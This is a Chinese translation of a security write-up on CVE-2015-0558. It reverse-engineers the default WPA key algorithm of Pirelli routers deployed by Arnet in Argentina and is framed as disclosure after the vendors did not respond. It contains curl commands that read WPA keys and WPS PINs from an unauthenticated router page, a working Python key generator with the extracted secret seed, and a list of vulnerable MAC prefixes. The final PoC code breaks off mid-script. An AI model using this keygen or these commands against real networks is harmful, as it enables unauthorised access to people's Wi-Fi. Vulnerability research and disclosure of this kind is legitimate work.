CVE-2015-0558:逆向阿根廷Pirelli路由器WPA密钥生成算法

2015-01-06 21:03:57 阅读：16869次 点赞(0) 收藏 来源： 360安全播报

Sticker with default settings

几年之前，如果我没记错的话，我还在做一些由Pirelli部署的西班牙路由器的逆向工程。当我将固件提取出来之后，发现一个可疑的数据库里面有许多引用密钥生成的功能。不幸的是，我没能够恢复算法本身。主要的原因是那些路由器在生成默认密钥时由于此类算法没有明确出现而并未使用相同的算法。然而，由于我无法披露这一算法，我决定用另一种方式来恢复密钥。最后，我意识到，这些路由器容易受到未经授权且未经认证的远程访问，并且任何对手都可以从我们的公开IP地址中获取HTML代码。许多HTML都能够被毫无限制地下载，意味着会出现大量泄漏。这些路由器容易受到许多恶意攻击。这一远程信息披露可查看CVE-2015-0554。但是，我并不知道阿根廷的路由器是否也容易受到这一漏洞的攻击。大家可以试试并且请将结果告诉我。

要想知道在HomeStation(essids-like WLAN_XXXX)获取这些密钥有多容易，只要看看这个简单的curl命令就足够了：

$ curl -s http://${IP_ADDRESS}/wlsecurity.html | grep -i "WLAN_"
                  <option value='0'>WLAN_DEAD</option>
 
$ curl -s http://${IP_ADDRESS}/wlsecurity.html | grep -i "var wpapskkey"
var wpaPskKey = 'IsAklFHhFFui1sr9ZMqD';
 
$ curl -s http://${IP_ADDRESS}/wlsecurity.html | grep -i "var WscDevPin"
var WscDevPin    = '12820078';

今天，我将解释一下我是如何将一个MIPS库进行逆向工程并为Pirelli部署的一些阿根廷路由器恢复至默认WPA密钥生成算法。具体来讲，受影响的这个路由器是P.DG-A4001N型号。首先声明一点，我并不是阿根廷人也不在那儿生活。尽管如此，我在一个论坛上发现了Pirelli路由器的一些标贴，并且既然用户已公布了那些路由器的固件，我决定试一试。趁我还记得查找西班牙路由器的文件，我迅速地尝试在这些路由器中恢复算法。以下内容是我实现这个目标的步骤。

逆向工程默认密钥生成算法

在这节内容中，我们将逆向工程一个MIPS库/lib/private/libcms.core，这是从固件本身发现的。首先，我们声明一点，这个固件是从另外一个用户（fernando3k）那里提取到的，而随后的提取是通过使用Binwalk以及firmware-mod-kit完成的。将固件安装到系统之后，我们发现有一个名为generatekey的函数。正如你所看到的那样，symbols并未在二进制中删除，由于动态编译的原因，外部函数名称依然存在。这对我们完成逆向工程起到了很大的作用。最重要的是，我们快速发现了这一函数是如何调用另外一个函数generatekey_from_mac的。我决定接受这一挑战。在开始之前，IDA Pro帮助我们理顺了函数间的交叉引用（Xrefs to-from in IDA PRO）。让我们看看函数在库中是如何被调用的。

看起来很棒。现在我们再来看看交叉引用。一些小技巧如下：

1.generatekey调用generatekey_from_mac。这说明密钥生成算法中涉及

mac地址。此外，getPBSHwaddr返回一个mac地址并且同时被generatekey调用。在检查了getPBSHwaddr是如何返回/var/hwaddr ( “ifconfig %s > /var/hwaddr “)值之后，我们进行了验证。

2.SHA256加密hash函数也牵涉其中。随后我们了解到我们的密钥来自

一个知名hash函数。这种生成WPA密钥的方法在一些提供商那里非常流行，因为这有一种“随意性”的感觉。对这个函数深入挖掘会带给我们关于算法的主要框架。

3.createWPAPassphraseFromKey函数被wlWriteMdmDefault调用，后者同

时调用了generatekey。因此，我们发现了一个叫做bintoascii的函数，这个函数基本上负责将二进制转换为ascii数据。

4.同时mac地址还创建了SSID，虽然这与我们的任务并没有什么关联。

（createWPAPassphraseFromKey调用流程）

现在，我们必须对generatekey_from_mac函数以及SHA256调用进行解读以明确有多少个参数被作为输入数据进行发送。在调用generatekey之前，一个字符串“1236790”被发送至这个函数作为第一个参数（$a0）。然而，我们不得不通过猜测来知道SHA256函数的正确顺序是什么，我意思是说，到底存在多少个更新。以下图片展示了这一步骤。

从generatekey_from_mac中，我们发现：（见下面图片）

1.      第一个参数位于偏移0x000d29e0

2.      第二个参数是我们之前发现的字符串 (“1236790”)

3.      第三个参数必须是mac地址，因为有一个值为6的指令load immediate。由于有一个mac地址是6个字节，我们现在可以试一下了。

我们知道第一个参数位于偏移0xd29e0，来看看SHA256使用的秘密种子。当前，我们已经猜到第一个参数，这样我们可以将那些32位字节准备到一个字节数组结构以便生成SHA256 hash。这个秘密种子也被Pirelli用于其他国家，如意大利、奥地利（可参照源代码了解更多信息）。此外，我们还可以区分最后用来生成密钥所使用的字符集。

（库中找到的秘密种子）

最后，我们得出结论也就是算法如下：（mac地址需要1个增量）

def genkey(mac):
    seed = ('\x64\xC6\xDD\xE3\xE5\x79\xB6\xD9\x86\x96\x8D\x34\x45\xD2\x3B\x15' +
            '\xCA\xAF\x12\x84\x02\xAC\x56\x00\x05\xCE\x20\x75\x91\x3F\xDC\xE8')
 
    lookup  = '0123456789abcdefghijklmnopqrstuvwxyz'
     
    sha256 = hashlib.sha256()
    sha256.update(seed)
    sha256.update('1236790')
    sha256.update(mac)
 
    digest = bytearray(sha256.digest())
        
    return ''.join([lookup[x % len(lookup)] for x in digest[0:10]])

问题

因为我向做一个负责任的披露，而ADB Pirelli及Arnet（阿根廷）都没有兴趣讨论这一问题，因此我打算将算法完全公开以督促修复过程。似乎对于某些提供商来说，这是唯一一种处理方法即强迫他们更换路由器以避免遭到入侵。不论你的路由器SSID Wifi-Arnet-XXXX是否有默认密码。需要知道的是，默认密码位于路由器底部的标贴上。如果你是这些网络的拥有者，请尽快更换密码。你应当经常更改默认密码。

恶意分子如果在wifi覆盖范围之内，可以访问你的网络并且进行任意一种诈骗行为。注意安全并且马上修改你的密码！

def genkey(mac,stdout='True'):
    seed = ('\x64\xC6\xDD\xE3\xE5\x79\xB6\xD9\x86\x96\x8D\x34\x45\xD2\x3B\x15' +
            '\xCA\xAF\x12\x84\x02\xAC\x56\x00\x05\xCE\x20\x75\x91\x3F\xDC\xE8')
 
    lookup  = '0123456789abcdefghijklmnopqrstuvwxyz'
     
    sha256 = hashlib.sha256()
    sha256.update(seed)
    sha256.update('1236790')
    sha256.update(mac)
 
    digest = bytearray(sha256.digest())
 
    if (stdout):
        print "[+] SHA256  : %s" % sha256.hexdigest()
         
    return ''.join([lookup[x % len(lookup)] for x in digest[0:10]])
 
 
def printTargets():
        print "[+] Possible vulnerable targets so far:"
        for t in targets:
            print ("\t bssid: {0:s}:XX:XX:XX \t essid: Wifi-Arnet-XXXX".format(t.upper()))
 
        sys.exit()
 
def checkTargets(bssid):
        supported = False
        for t in targets:
            if ( bssid.upper().startswith(t) ):
                supported = True
                break
        if (not supported):
            print "[!] Your bssid looks like not supported! Generating anyway."
         
def main():
     
    global targets
    version     = " {0:d}.{1:d}  [{2:s}] ----> {3:s}".format(VERSION,SUBVERSION,DATEVERSION,URL)
    targets = ['00:08:27','00:13:C8','00:17:C2','00:19:3E','00:1C:A2','00:1D:8B','00:22:33','00:8C:54',
    '30:39:F2','74:88:8B','84:26:15','A4:52:6F','A4:5D:A1','D0:D4:12','D4:D1:84','DC:0B:1A','F0:84:2F']
     
    parser = argparse.ArgumentParser(description='''>>> PoC WPA keygen for WiFi Networks deployed by Arnet in Argentina. So far

                                                 Twitter: @enovella_  and   email: ednolo[at]inf.upv.es''',
                                                 epilog='''(+) Help: python %s -b 74:88:8B:AD:C0:DE ''' %(sys.argv[0])
                                    )

    maingroup.add_argument('-b','--bssid', type=str, nargs='?', help='Target mac address')
    parser.add_argument('-v', '--version', action='version', version='%(prog)s'+version)
    command_group = parser.add_mutually_exclusive_group()
    command_group.add_argument('-l','--list', help='List all vulnerable targets (essid Wifi-Arnet-XXXX)', action='store_true')
     
    args = parser.parse_args()

        printTargets()
    elif args.bssid:
